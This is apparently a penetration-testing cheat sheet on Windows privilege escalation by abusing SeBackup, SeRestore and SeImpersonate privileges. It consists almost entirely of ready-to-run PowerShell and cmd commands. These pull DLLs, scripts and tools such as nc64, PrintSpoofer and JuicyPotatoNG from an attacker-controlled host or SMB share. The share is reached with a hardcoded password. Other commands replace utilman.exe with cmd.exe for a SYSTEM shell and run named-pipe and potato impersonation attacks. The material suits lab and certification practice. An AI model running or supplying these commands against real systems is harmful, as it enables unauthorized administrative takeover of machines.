# Privileges

```powershell
# Check current privileges
whoami /priv
```

## SeBackupPrivilege

{% code overflow="wrap" %}
```powershell
$lhost = '10.4.29.43'
Invoke-WebRequest -Uri "http://$lhost/windows/privesc/SeBackupPrivilege/SeBackupPrivilegeCmdLets.dll" -OutFile SeBackupPrivilegeCmdLets.dll
Invoke-WebRequest -Uri "http://$lhost/windows/privesc/SeBackupPrivilege/SeBackupPrivilegeUtils.dll" -OutFile SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege C:\users\administrator\desktop\flag.txt flag2.txt
```
{% endcode %}

## SeRestorePrivilege

{% code overflow="wrap" %}
```powershell
# Download EnableSeRestorePrivilege
certutil.exe -f -urlcache http://$lhost/windows/privsec/SeRestorePrivilege/EnableSeRestorePrivilege.ps1 EnableSeRestorePrivilege.ps1
# Import EnableSeRestorePrivilege
. .\EnableSeRestorePrivilege.ps1
# Rename utilman.exe to utilman.old
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
# Rename cmd.exe to utilman.exe
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Connect via RDP then Windows key + u 
rdesktop $ip
```
{% endcode %}

## SeImpersonatePrivilege

```powershell
# Start cmd.exe as nt authority\network service
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
# Verify user and privileges
whoami
whoami /priv

net use x: \\10.10.16.2\visualstudio /user:kali @WSX2wsx
cd \windows\tasks
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\ActiveDirectoryExploitation\PrintSpoofer.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe
# Creating the pipe server as Network Service account
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
# Invoke SpoolSample with forward slash
SpoolSample.exe appsrv01 appsrv01/pipe/test

# JuicyPotato
net use x: \\10.10.16.2\visualstudio /user:kali @WSX2wsx
copy X:\JuicyPotatoNG.exe
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```
